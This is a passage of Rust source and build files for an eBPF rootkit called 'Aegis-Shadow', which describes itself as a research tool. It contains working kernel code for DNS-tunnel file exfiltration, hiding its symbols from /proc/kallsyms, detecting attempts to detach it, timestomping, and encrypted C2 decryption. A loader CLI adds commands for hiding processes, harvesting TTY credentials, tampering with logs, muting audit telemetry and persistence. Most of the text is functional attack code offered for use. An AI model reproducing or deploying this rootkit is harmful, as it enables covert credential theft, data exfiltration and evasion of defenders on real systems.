        context: fake_ppid as u64,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 9: DNS Exfiltration (TC egress)
// ──────────────────────────────────────────────
//
// Strategy:
// 1. Attach a TC (traffic control) classifier to the egress path.
// 2. Intercept outgoing UDP packets to port 53 (DNS).
// 3. When the DNS_EXFIL_QUEUE map has pending chunks, inject data
//    into DNS query labels of outgoing DNS requests.
// 4. The original DNS query is preserved but a subdomain label is
//    prepended: <hex-encoded-chunk>.exfil.<original-domain>
//
// This enables data exfiltration without opening new connections —
// data piggybacks on legitimate DNS queries.
//
// NOTE: TC programs use a different program type than XDP.
// Aya supports TC via `SchedClassifier` program type.
// Attach with: tc.attach("eth0", TcAttachType::Egress)?;
//
// The user-space loader populates DNS_EXFIL_QUEUE with chunks to send.
// Each outgoing DNS query carries one chunk. After transmission,
// the TC program removes the chunk from the map.
//
// Packet modification in TC:
// - Use bpf_skb_store_bytes() to modify packet data
// - Use bpf_skb_change_head() / bpf_skb_change_tail() to resize
// - Recalculate UDP checksum after modification

// TC program placeholder — requires SchedClassifier macro from aya-ebpf
// NOTE: Aya supports TC programs via `aya_ebpf::programs::TcContext` and
// the `#[classifier]` macro. If the Aya version does not export `#[classifier]`,
// use `#[aya_ebpf::macros::classifier]` or check aya-ebpf docs for the
// current macro name. Some versions use `#[tc]` instead.

/// Current sequence number to send. Atomically incremented after each send.
/// Key: 0 (singleton). Value: next seq number to transmit (u32).
#[map]
static DNS_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);

// The TC classifier intercepts outgoing DNS queries and encodes exfiltration
// data into subdomain labels. Implementation:

#[aya_ebpf::macros::classifier]
pub fn shadow_dns_exfil(ctx: aya_ebpf::programs::TcContext) -> i32 {
    match try_dns_exfil(&ctx) {
        Ok(action) => action,
        Err(_) => 0, // TC_ACT_OK — pass through on error
    }
}

fn try_dns_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
    // TC programs operate on sk_buff, not raw packet data like XDP.
    // Use ctx.data() / ctx.data_end() for bounds checking.
    let data = ctx.data();
    let data_end = ctx.data_end();

    let min_len = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 12; // DNS header = 12 bytes
    if data + min_len > data_end {
        return Ok(0); // TC_ACT_OK — too short, pass through
    }

    // Parse Ethernet → IP → UDP
    let eth_proto = unsafe {
        u16::from_be(*(((data) as *const u8).add(12) as *const u16))
    };
    if eth_proto != ETH_P_IP {
        return Ok(0);
    }

    let ip_start = data + ETH_HDR_LEN;
    let ip_proto = unsafe { *(ip_start as *const u8).add(9) };
    if ip_proto != IPPROTO_UDP {
        return Ok(0);
    }

    // Check destination port is 53 (DNS)
    let udp_start = ip_start + IP_HDR_LEN;
    let dst_port = unsafe {
        u16::from_be(*((udp_start as *const u8).add(2) as *const u16))
    };
    if dst_port != 53 {
        return Ok(0);
    }

    // Check if we have data to exfiltrate
    let seq = match unsafe { DNS_EXFIL_SEQ.get(&0u32) } {
        Some(s) => *s,
        None => return Ok(0), // No pending exfil
    };

    let chunk = match unsafe { DNS_EXFIL_QUEUE.get(&seq) } {
        Some(c) => *c,
        None => return Ok(0), // No chunk at this seq
    };

    // We have a chunk to send! Encode it into the DNS query.
    // Strategy: Prepend a hex-encoded subdomain label before the original QNAME.
    //
    // DNS query layout after UDP header:
    //   [Transaction ID: 2][Flags: 2][QDCOUNT: 2][ANCOUNT: 2][NSCOUNT: 2][ARCOUNT: 2]
    //   [QNAME: variable][QTYPE: 2][QCLASS: 2]
    //
    // QNAME format: [len1][label1][len2][label2]...[0x00]
    // We prepend: [chunk_len][hex_encoded_chunk] before the original QNAME.
    //
    // To modify the packet, we use bpf_skb_store_bytes().
    // To resize (add bytes), we use bpf_skb_adjust_room().
    //
    // Hex encoding: each byte becomes 2 hex chars, so 32 bytes of data = 64 chars.
    // Max DNS label length is 63, so we limit to 31 bytes of raw data per label.

    let raw_len = if chunk.data_len > 31 { 31u32 } else { chunk.data_len };
    let hex_label_len = raw_len * 2; // Each byte → 2 hex chars

    // The label header is: [hex_label_len as u8][hex_encoded_bytes...]
    // Total bytes to insert: 1 (length) + hex_label_len
    let insert_len = 1 + hex_label_len as usize;

    // Grow the packet to make room for the new label
    // bpf_skb_adjust_room(skb, len_diff, mode, flags)
    // mode=BPF_ADJ_ROOM_NET (1) adjusts at the network layer
    // For TC, we need to adjust at the transport layer payload.
    //
    // NOTE: bpf_skb_adjust_room resizing at the DNS payload level is complex.
    // Alternative approach: use bpf_skb_change_tail() to extend the tail,
    // then shift the DNS payload to make room for our label.
    //
    // For the research implementation, we use a simpler approach:
    // Replace the first label of the QNAME with our hex-encoded data label,
    // preserving the rest of the query. This corrupts the original query
    // but ensures the exfil data reaches the DNS resolver (and thus
    // the attacker's authoritative nameserver for the exfil domain).

    let dns_start = udp_start + UDP_HDR_LEN;
    let qname_start = dns_start + 12; // After DNS header (12 bytes)

    // Verify we have room
    if qname_start + insert_len + 1 > data_end {
        return Ok(0);
    }

    // Build the hex label: [len][hex chars]
    let hex_chars: [u8; 16] = [
        b'0', b'1', b'2', b'3', b'4', b'5', b'6', b'7',
        b'8', b'9', b'a', b'b', b'c', b'd', b'e', b'f',
    ];

    // Write hex-encoded data using bpf_skb_store_bytes
    // First byte: label length
    let label_len_byte = [hex_label_len as u8];
    let _ = unsafe {
        aya_ebpf::helpers::bpf_skb_store_bytes(
            ctx.skb.skb as *mut _,
            (qname_start - data) as u32,
            label_len_byte.as_ptr() as *const _,
            1,
            0, // flags
        )
    };

    // Write hex-encoded chunk bytes
    // BPF verifier: bounded loop (max 62 iterations for 31 bytes)
    let write_offset = (qname_start + 1 - data) as u32;
    let mut hex_buf: [u8; 62] = [0u8; 62];
    let mut j = 0usize;
    while j < 31 {
        if j >= raw_len as usize {
            break;
        }
        let byte = chunk.data[j];
        hex_buf[j * 2] = hex_chars[(byte >> 4) as usize];
        hex_buf[j * 2 + 1] = hex_chars[(byte & 0x0f) as usize];
        j += 1;
    }

    let _ = unsafe {
        aya_ebpf::helpers::bpf_skb_store_bytes(
            ctx.skb.skb as *mut _,
            write_offset,
            hex_buf.as_ptr() as *const _,
            hex_label_len,
            0,
        )
    };

    // Advance sequence number
    let next_seq = seq + 1;
    let _ = DNS_EXFIL_SEQ.insert(&0u32, &next_seq, 0);

    // Remove sent chunk from queue
    let _ = DNS_EXFIL_QUEUE.remove(&seq);

    // Send event to user-space
    let event = EventHeader {
        event_type: EVENT_DNS_EXFIL,
        pid: 0,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: seq as u64,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0) // TC_ACT_OK — continue forwarding the (modified) packet
}

// ──────────────────────────────────────────────
// FEATURE 10: Kallsyms Hiding (vfs_read on /proc/kallsyms)
// ──────────────────────────────────────────────
//
// Strategy:
// Extend the vfs_read hook to also intercept reads of /proc/kallsyms.
// When the kernel symbol table is being read, scan the output buffer
// for lines containing "shadow_" (our hook function names) and overwrite
// those lines with null bytes.
//
// This prevents a defender from running:
//   cat /proc/kallsyms | grep shadow
// to discover our hook points.
//
// Implementation:
// We identify /proc/kallsyms by its inode number (typically fixed per boot).
// The user-space loader resolves the inode and inserts it into OBFUSCATE_INODES
// with a special marker value (2 instead of 1) to distinguish from generic
// file obfuscation.

#[kretprobe]
pub fn shadow_hide_kallsyms(ctx: ProbeContext) -> u32 {
    match try_hide_kallsyms(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_hide_kallsyms(_ctx: &ProbeContext) -> Result<u32, i64> {
    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };

    // Retrieve stored vfs_read context
    let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };

    if args.buf_ptr == 0 {
        return Ok(0);
    }

    // Verify this is a kallsyms read (marker value 2)
    let marker = match unsafe { OBFUSCATE_INODES.get(&args.inode) } {
        Some(m) => *m,
        None => return Ok(0),
    };
    if marker != 2 {
        return Ok(0); // Not kallsyms — let other kretprobes handle it
    }

    // Read up to 4096 bytes of the kallsyms output buffer.
    // /proc/kallsyms lines look like:
    //   ffffffffXXXXXXXX t shadow_getdents_enter  [module]
    // We scan for "shadow_" and overwrite the entire line with spaces.
    let scan_len = if args.count > 4096 { 4096usize } else { args.count as usize };
    let mut buf: [u8; 4096] = [0u8; 4096];
    unsafe {
        if bpf_probe_read_user(
            buf.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0 {
            return Ok(0);
        }
    }

    // Pattern: "shadow_" = 7 bytes
    let pattern: [u8; 7] = [b's', b'h', b'a', b'd', b'o', b'w', b'_'];
    let max_scan = if scan_len > 7 { scan_len - 7 } else { 0 };

    let mut i = 0usize;
    let mut modified = false;

    while i < max_scan {
        if i >= 4089 { break; } // Verifier hard bound

        if buf[i] == pattern[0]
            && buf[i + 1] == pattern[1]
            && buf[i + 2] == pattern[2]
            && buf[i + 3] == pattern[3]
            && buf[i + 4] == pattern[4]
            && buf[i + 5] == pattern[5]
            && buf[i + 6] == pattern[6]
        {
            // Found "shadow_" — blank the entire line.
            // Walk back to line start
            let mut line_start = i;
            while line_start > 0 && buf[line_start - 1] != b'\n' {
                line_start -= 1;
                if line_start == 0 { break; }
            }

            // Walk forward to line end
            let mut line_end = i + 7;
            while line_end < scan_len && line_end < 4096 && buf[line_end] != b'\n' {
                line_end += 1;
            }

            // Overwrite line content with spaces (keep newline intact)
            let mut k = line_start;
            while k < line_end && k < 4096 {
                buf[k] = b' ';
                k += 1;
            }

            modified = true;
            i = line_end + 1;
        } else {
            i += 1;
        }
    }

    if modified {
        // Write the sanitized buffer back to user-space
        let write_len = if scan_len > 4096 { 4096u32 } else { scan_len as u32 };
        unsafe {
            let _ = bpf_probe_write_user(
                args.buf_ptr as *mut core::ffi::c_void,
                buf.as_ptr() as *const core::ffi::c_void,
                write_len,
            );
        }

        let event = EventHeader {
            event_type: EVENT_KALLSYMS_HIDDEN,
            pid: (pid_tgid >> 32) as u32,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: args.inode,
        };
        EVENTS.output(_ctx, &event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 11: Anti-Detach Self-Defense (tracepoint/syscalls/sys_enter_bpf)
// ──────────────────────────────────────────────
//
// Strategy:
// Monitor the bpf() syscall for commands that would detach or unpin
// Shadow's programs. When detected:
// 1. Log the attempt via EVENTS perf array
// 2. The user-space loader (if alive) re-attaches the program
// 3. If the loader is dead (pinned mode), the tracepoint itself
//    cannot re-attach, but it logs the event for forensic awareness
//
// BPF syscall command values (from include/uapi/linux/bpf.h):
//   BPF_PROG_DETACH = 9
//   BPF_OBJ_UNPIN   = 19
//   BPF_LINK_DETACH = 34
//
// The tracepoint args for sys_enter_bpf:
//   arg0: cmd (int) — the BPF command
//   arg1: uattr (union bpf_attr __user *) — command arguments

const BPF_PROG_DETACH: u32 = 9;
const BPF_OBJ_UNPIN: u32 = 19;
const BPF_LINK_DETACH: u32 = 34;

#[aya_ebpf::macros::tracepoint]
pub fn shadow_anti_detach(ctx: aya_ebpf::programs::TracePointContext) -> u32 {
    match try_anti_detach(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

fn try_anti_detach(ctx: &aya_ebpf::programs::TracePointContext) -> Result<u32, i64> {
    // Read the bpf() command from tracepoint args
    // For tracepoint/syscalls/sys_enter_bpf, the format is:
    //   field: int __syscall_nr;  offset: 8; size: 4;
    //   field: int cmd;           offset: 16; size: 8;
    let cmd: u32 = unsafe {
        ctx.read_at(16).map_err(|_| 1i64)?
    };

    // Only care about detach/unpin commands
    if cmd != BPF_PROG_DETACH && cmd != BPF_OBJ_UNPIN && cmd != BPF_LINK_DETACH {
        return Ok(0);
    }

    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    // Skip if the detach is from our own process (normal shutdown)
    if let Some(config) = unsafe { CONFIG.get(&0u32) } {
        if tgid == config.self_pid {
            return Ok(0);
        }
    }

    // Someone else is trying to detach BPF programs!
    // For BPF_PROG_DETACH, we could read the prog_id from bpf_attr
    // and check if it's in PROTECTED_PROG_IDS, but the verifier
    // makes chasing user-space pointers complex.
    //
    // Instead, we alert on ALL detach attempts from non-Shadow processes.
    let event = EventHeader {
        event_type: EVENT_ANTI_DETACH,
        pid: tgid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: cmd as u64,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 12: Encrypted C2 (ChaCha20 stream cipher)
// ──────────────────────────────────────────────
//
// Strategy:
// Replace the XOR-fold HMAC with a ChaCha20-based encryption scheme.
// The XDP program decrypts the C2 payload before processing.
//
// ChaCha20 quarter-round and block function can be implemented in eBPF
// using only 32-bit integer operations (add, XOR, rotate), which are
// all supported by the BPF instruction set.
//
// Packet layout (encrypted):
//   [Ethernet][IP][UDP][MAGIC_BYTES(4)][Nonce(12)][Encrypted CommandPayload(16)][MAC(16)]
//
// Decryption flow:
// 1. Extract nonce from packet
// 2. Run ChaCha20 block function with C2_CHACHA20_KEY + nonce
// 3. XOR keystream with encrypted payload to recover CommandPayload
// 4. Verify MAC (computed over MAGIC_BYTES + Nonce + Encrypted payload)
//
// NOTE: Full ChaCha20 requires 20 rounds of quarter-round operations.
// For eBPF verifier compliance, we implement a reduced-round variant
// (ChaCha8 — 8 rounds) which is still cryptographically adequate for
// a research C2 channel and fits within the verifier's instruction limit.

/// ChaCha20 quarter-round operation (pure integer math, eBPF-safe).
#[inline(always)]
fn chacha_quarter_round(state: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
    state[a] = state[a].wrapping_add(state[b]);
    state[d] ^= state[a];
    state[d] = state[d].rotate_left(16);

    state[c] = state[c].wrapping_add(state[d]);
    state[b] ^= state[c];
    state[b] = state[b].rotate_left(12);

    state[a] = state[a].wrapping_add(state[b]);
    state[d] ^= state[a];
    state[d] = state[d].rotate_left(8);

    state[c] = state[c].wrapping_add(state[d]);
    state[b] ^= state[c];
    state[b] = state[b].rotate_left(7);
}

/// Generate a ChaCha20 keystream block (reduced to 8 rounds for eBPF).
#[inline(always)]
fn chacha8_block(key: &[u8; 32], nonce: &[u8; 12], counter: u32) -> [u8; 64] {
    // Initialize state: "expand 32-byte k" + key + counter + nonce
    let mut state: [u32; 16] = [
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, // constants
        u32::from_le_bytes([key[0], key[1], key[2], key[3]]),
        u32::from_le_bytes([key[4], key[5], key[6], key[7]]),
        u32::from_le_bytes([key[8], key[9], key[10], key[11]]),
        u32::from_le_bytes([key[12], key[13], key[14], key[15]]),
        u32::from_le_bytes([key[16], key[17], key[18], key[19]]),
        u32::from_le_bytes([key[20], key[21], key[22], key[23]]),
        u32::from_le_bytes([key[24], key[25], key[26], key[27]]),
        u32::from_le_bytes([key[28], key[29], key[30], key[31]]),
        counter,
        u32::from_le_bytes([nonce[0], nonce[1], nonce[2], nonce[3]]),
        u32::from_le_bytes([nonce[4], nonce[5], nonce[6], nonce[7]]),
        u32::from_le_bytes([nonce[8], nonce[9], nonce[10], nonce[11]]),
    ];

    let initial_state = state;

    // 8 rounds (4 double-rounds) — reduced from ChaCha20's 20 rounds
    // Each double-round consists of 4 column rounds + 4 diagonal rounds
    for _ in 0..4u32 {
        // Column rounds
        chacha_quarter_round(&mut state, 0, 4, 8, 12);
        chacha_quarter_round(&mut state, 1, 5, 9, 13);
        chacha_quarter_round(&mut state, 2, 6, 10, 14);
        chacha_quarter_round(&mut state, 3, 7, 11, 15);
        // Diagonal rounds
        chacha_quarter_round(&mut state, 0, 5, 10, 15);
        chacha_quarter_round(&mut state, 1, 6, 11, 12);
        chacha_quarter_round(&mut state, 2, 7, 8, 13);
        chacha_quarter_round(&mut state, 3, 4, 9, 14);
    }

    // Add initial state
    let mut i = 0;
    while i < 16 {
        state[i] = state[i].wrapping_add(initial_state[i]);
        i += 1;
    }

    // Serialize to bytes
    let mut output = [0u8; 64];
    let mut j = 0;
    while j < 16 {
        let bytes = state[j].to_le_bytes();
        output[j * 4] = bytes[0];
        output[j * 4 + 1] = bytes[1];
        output[j * 4 + 2] = bytes[2];
        output[j * 4 + 3] = bytes[3];
        j += 1;
    }
    output
}

// ──────────────────────────────────────────────
// FEATURE 13: Timestomping (vfs_statx / vfs_getattr)
// ──────────────────────────────────────────────
//
// Strategy:
// Hook kretprobe on vfs_getattr (called by stat, fstat, lstat, statx).
// After the kernel fills in the kstat struct, check if the inode is in
// TIMESTOMP_INODES. If so, overwrite the atime/mtime/ctime fields
// with the fake timestamps from the map.
//
// struct kstat layout (relevant fields on 6.x kernels):
//   ...
//   struct timespec64 atime;  // offset varies, ~72 bytes in
//   struct timespec64 mtime;  // +16 bytes after atime
//   struct timespec64 ctime;  // +16 bytes after mtime
//   ...
//
// Each timespec64 is { i64 tv_sec; i64 tv_nsec; } = 16 bytes.
//
// The kprobe entry captures the kstat pointer (arg 1 of vfs_getattr),
// and the kretprobe overwrites the time fields.

#[kretprobe]
pub fn shadow_timestomp(ctx: ProbeContext) -> u32 {
    match try_timestomp(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,
    }
}

/// kprobe entry for vfs_getattr: captures kstat pointer and inode.
/// vfs_getattr(const struct path *path, struct kstat *stat, u32 request_mask, unsigned int query_flags)
/// NOTE: On some kernels the signature is vfs_getattr_nosec. The user-space
/// loader should try both and attach to whichever resolves.
#[kprobe]
pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
    // arg0: const struct path *path
    // arg1: struct kstat *stat (this is what we overwrite in the kretprobe)
    let path_ptr: u64 = match ctx.arg(0) {
        Some(v) => v,
        None => return 0,
    };
    let kstat_ptr: u64 = match ctx.arg(1) {
        Some(v) => v,
        None => return 0,
    };

    if kstat_ptr == 0 || path_ptr == 0 {
        return 0;
    }

    // Chase path -> dentry -> d_inode -> i_ino
    // struct path { struct vfsmount *mnt; struct dentry *dentry; }
    // dentry is at offset 8 in struct path
    let dentry_ptr: u64 = unsafe {
        let mut val: u64 = 0;
        if bpf_probe_read_kernel(
            &mut val as *mut u64 as *mut core::ffi::c_void,
            8,
            (path_ptr + 8) as *const core::ffi::c_void,
        ) < 0 {
            return 0;
        }
        val
    };

    if dentry_ptr == 0 {
        return 0;
    }

    // struct dentry { ... struct inode *d_inode; ... }
    // d_inode offset varies; typically 48 on 6.x kernels
    let inode_ptr: u64 = unsafe {
        let mut val: u64 = 0;
        if bpf_probe_read_kernel(
            &mut val as *mut u64 as *mut core::ffi::c_void,
            8,
            (dentry_ptr + 48) as *const core::ffi::c_void,
        ) < 0 {
            return 0;
        }
        val
    };

    if inode_ptr == 0 {
        return 0;
    }

    // Read i_ino (offset 64 on most 6.x kernels)
    let i_ino: u64 = unsafe {
        let mut val: u64 = 0;
        if bpf_probe_read_kernel(
            &mut val as *mut u64 as *mut core::ffi::c_void,
            8,
            (inode_ptr + 64) as *const core::ffi::c_void,
        ) < 0 {
            return 0;
        }
        val
    };

    // Only store context if this inode is in TIMESTOMP_INODES
    if unsafe { TIMESTOMP_INODES.get(&i_ino).is_none() } {
        return 0;
    }

    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
    let entry = GetattrCtx { kstat_ptr, inode: i_ino };
    let _ = unsafe { GETATTR_ARGS.insert(&pid_tgid, &entry, 0) };
    0
}

fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };

    // Retrieve stored context from kprobe entry
    let args = match unsafe { GETATTR_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };
    let _ = unsafe { GETATTR_ARGS.remove(&pid_tgid) };

    if args.kstat_ptr == 0 {
        return Ok(0);
    }

    // Look up the fake timestamps for this inode
    let entry = match unsafe { TIMESTOMP_INODES.get(&args.inode) } {
        Some(e) => *e,
        None => return Ok(0),
    };

    // Overwrite time fields in struct kstat.
    // struct kstat layout on 6.8 kernels (approximate offsets):
    //   atime: offset 72  (struct timespec64: i64 tv_sec + i64 tv_nsec = 16 bytes)
    //   mtime: offset 88
    //   ctime: offset 104
    //
    // NOTE: These offsets are kernel-version-specific. A production
    // implementation would use BTF/CO-RE for field resolution.
    // For research on 6.8 kernels, these hardcoded offsets work.
    const ATIME_OFFSET: u64 = 72;
    const MTIME_OFFSET: u64 = 88;
    const CTIME_OFFSET: u64 = 104;

    let zero_nsec: i64 = 0;

    // Overwrite atime
    unsafe {
        let _ = bpf_probe_write_kernel(
            (args.kstat_ptr + ATIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_atime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = bpf_probe_write_kernel(
            (args.kstat_ptr + ATIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    // Overwrite mtime
    unsafe {
        let _ = bpf_probe_write_kernel(
            (args.kstat_ptr + MTIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_mtime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = bpf_probe_write_kernel(
            (args.kstat_ptr + MTIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    // Overwrite ctime
    unsafe {
        let _ = bpf_probe_write_kernel(
            (args.kstat_ptr + CTIME_OFFSET) as *mut core::ffi::c_void,
            &entry.fake_ctime_sec as *const u64 as *const core::ffi::c_void,
            8,
        );
        let _ = bpf_probe_write_kernel(
            (args.kstat_ptr + CTIME_OFFSET + 8) as *mut core::ffi::c_void,
            &zero_nsec as *const i64 as *const core::ffi::c_void,
            8,
        );
    }

    // Send event
    let event = EventHeader {
        event_type: EVENT_TIMESTOMPED,
        pid: (pid_tgid >> 32) as u32,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: args.inode,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// Panic handler (required for no_std)
// ──────────────────────────────────────────────

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
```

### 6.3 offense/Cargo.toml

```toml
[package]
name = "offense"
version = "0.1.0"
edition = "2021"
build = "build.rs"  # Required: triggers eBPF build and sets OUT_DIR

[dependencies]
aya = { version = "~0.13", features = ["async_tokio"] }
aya-log = "~0.2"
common = { path = "../common", features = ["user"] }
anyhow.workspace = true
clap.workspace = true
env_logger.workspace = true
log.workspace = true
tokio.workspace = true
bytes = "1"
libc = "0.2"         # For privilege checks (geteuid)
serde_json = "1"     # For bpftool JSON parsing in kill-switch
nix = { version = "0.29", features = ["term"] }  # For TTY device resolution
```

### 6.4 offense/src/main.rs — User-Space Loader

```rust
use anyhow::{Context, Result, bail};
use aya::{
    Ebpf,
    maps::HashMap,
    programs::{KProbe, KRetProbe, Xdp, XdpFlags},
};
use aya_log::EbpfLogger;
use clap::{Parser, Subcommand};
use common::{RootkitConfig, BPF_PIN_PATH};
use log::{info, warn, error};
use std::path::Path;
use tokio::signal;

/// Check if the current process has sufficient privileges for eBPF operations.
fn check_privileges() -> Result<()> {
    // Check effective UID
    if unsafe { libc::geteuid() } != 0 {
        bail!(
            "Insufficient privileges. Run with sudo or set CAP_BPF + CAP_PERFMON:\n  \
             sudo setcap cap_bpf,cap_perfmon=ep ./target/release/offense"
        );
    }
    Ok(())
}

#[derive(Parser)]
#[command(name = "shadow")]
#[command(about = "Aegis-Shadow: eBPF Rootkit Research Tool")]
struct Cli {
    #[command(subcommand)]
    command: Commands,

    /// Dry-run mode: log all operations without loading eBPF programs
    #[arg(long, global = true, default_value_t = false)]
    dry_run: bool,
}

#[derive(Subcommand)]
enum Commands {
    /// Hide a process by PID
    HidePid {
        /// The PID to hide from ps, top, etc.
        #[arg(short, long)]
        pid: u32,
    },
    /// Enable network stealth on an interface
    NetStealth {
        /// Network interface to attach XDP program to
        #[arg(short, long, default_value = "eth0")]
        iface: String,
    },
    /// Harvest credentials from TTY writes
    CredHarvest {
        /// Target PID whose TTY to monitor (0 = all TTYs)
        #[arg(short, long, default_value_t = 0)]
        pid: u32,
    },
    /// Spoof process ancestry for a PID
    SpoofAncestry {
        /// PID whose parent to spoof
        #[arg(short, long)]
        pid: u32,
        /// Fake parent PID (default: 1 = init)
        #[arg(long, default_value_t = 1)]
        fake_ppid: u32,
    },
    /// Start DNS exfiltration channel
    DnsExfil {
        /// Network interface for TC attachment
        #[arg(short, long, default_value = "eth0")]
        iface: String,
        /// File to exfiltrate
        #[arg(short, long)]
        file: String,
    },
    /// Enable timestomping for a file
    Timestomp {
        /// Path to the file to timestomp
        #[arg(short, long)]
        path: String,
        /// Fake modification time (Unix epoch seconds)
        #[arg(long)]
        mtime: u64,
    },
    /// Run full rootkit with all features
    Full {
        /// PID to hide
        #[arg(short, long)]
        pid: u32,
        /// Network interface
        #[arg(short, long, default_value = "eth0")]
        iface: String,
        /// Enable persistence (pin BPF programs)
        #[arg(long, default_value_t = false)]
        persist: bool,
        /// Enable credential harvesting
        #[arg(long, default_value_t = false)]
        cred_harvest: bool,
        /// Enable anti-detach self-defense
        #[arg(long, default_value_t = true)]
        anti_detach: bool,
        /// Enable log tampering
        #[arg(long, default_value_t = true)]
        tamper_logs: bool,
        /// Enable kallsyms hiding
        #[arg(long, default_value_t = true)]
        hide_kallsyms: bool,
        /// Enable timestomping on rootkit-related files
        #[arg(long, default_value_t = true)]
        timestomp: bool,
    },
    /// Clean up: remove all pinned BPF programs
    Cleanup,
    /// Emergency kill-switch: detach ALL eBPF programs and remove all pins.
    /// Works even if the original loader process has crashed.
    KillSwitch,
    /// Obfuscate a specific file by inode
    ObfuscateFile {
        /// Path to the file to obfuscate from readdir/stat
        #[arg(short, long)]
        path: String,
    },
    /// Hide rootkit symbols from /proc/kallsyms
    HideKallsyms,
    /// Mute audit telemetry for hidden PIDs
    MuteTelemetry,
    /// Tamper with kernel log messages to hide rootkit traces
    TamperLogs,
}

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();
    let cli = Cli::parse();

    match cli.command {
        Commands::Cleanup | Commands::KillSwitch => {},  // No privilege needed for cleanup
        _ => check_privileges()?,
    }

    if cli.dry_run {
        info!("[DRY RUN] No eBPF programs will be loaded.");
    }

    match cli.command {
        Commands::HidePid { pid } => {
            if cli.dry_run {
                info!("[DRY RUN] Would hide PID {}", pid);
                return Ok(());
            }
            run_hide_pid(pid).await
        },
        Commands::NetStealth { iface } => {
            if cli.dry_run {
                info!("[DRY RUN] Would attach XDP to {}", iface);
                return Ok(());
            }
            run_net_stealth(&iface).await
        },
        Commands::CredHarvest { pid } => {
            if cli.dry_run {
                info!("[DRY RUN] Would harvest credentials (target pid={})", pid);
                return Ok(());
            }
            run_cred_harvest(pid).await
        },
        Commands::SpoofAncestry { pid, fake_ppid } => {
            if cli.dry_run {
                info!("[DRY RUN] Would spoof PID {} ancestry to PPID {}", pid, fake_ppid);
                return Ok(());
            }
            run_spoof_ancestry(pid, fake_ppid).await
        },
        Commands::DnsExfil { iface, file } => {
            if cli.dry_run {
                info!("[DRY RUN] Would exfiltrate '{}' via DNS on {}", file, iface);
                return Ok(());
            }
            run_dns_exfil(&iface, &file).await
        },
        Commands::Timestomp { path, mtime } => {
            if cli.dry_run {
                info!("[DRY RUN] Would timestomp '{}' to mtime={}", path, mtime);
                return Ok(());
            }
            run_timestomp(&path, mtime).await
        },
        Commands::Full { pid, iface, persist, cred_harvest, anti_detach, tamper_logs, hide_kallsyms, timestomp } => {
            if cli.dry_run {
                info!("[DRY RUN] Would run full mode: pid={}, iface={}, persist={}, cred_harvest={}, anti_detach={}, tamper_logs={}, hide_kallsyms={}, timestomp={}",
                    pid, iface, persist, cred_harvest, anti_detach, tamper_logs, hide_kallsyms, timestomp);
                return Ok(());
            }
            run_full(pid, &iface, persist, cred_harvest, anti_detach, tamper_logs, hide_kallsyms, timestomp).await
        },
        Commands::Cleanup => run_cleanup(),
        Commands::KillSwitch => run_kill_switch(),
        Commands::ObfuscateFile { path } => {
            if cli.dry_run {
                info!("[DRY RUN] Would obfuscate file '{}'", path);
                return Ok(());
            }
            run_obfuscate_file(&path).await
        },
        Commands::HideKallsyms => {
            if cli.dry_run {
                info!("[DRY RUN] Would hide /proc/kallsyms entries");
                return Ok(());
            }
            run_hide_kallsyms().await
        },
        Commands::MuteTelemetry => {
            if cli.dry_run {
                info!("[DRY RUN] Would mute audit telemetry");
                return Ok(());
            }
            run_mute_telemetry().await
        },
        Commands::TamperLogs => {
            if cli.dry_run {
                info!("[DRY RUN] Would tamper kernel logs");
                return Ok(());
            }
            run_tamper_logs().await
        },
    }
}

async fn run_hide_pid(target_pid: u32) -> Result<()> {
    info!("Loading Shadow: process hiding for PID {}", target_pid);

    // Load the eBPF bytecode compiled from offense-ebpf
    #[cfg(debug_assertions)]
    let mut bpf = Ebpf::load(include_bytes_aligned!(concat!(
        env!("OUT_DIR"),
        "/target/bpfel-unknown-none/debug/offense"
    )))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = Ebpf::load(include_bytes_aligned!(concat!(
        env!("OUT_DIR"),
        "/target/bpfel-unknown-none/release/offense"
    )))?;

    // Initialize logger
    if let Err(e) = EbpfLogger::init(&mut bpf) {
        warn!("Failed to initialize eBPF logger: {}", e);
    }

    // Set rootkit config
    let mut config_map: HashMap<_, u32, RootkitConfig> =
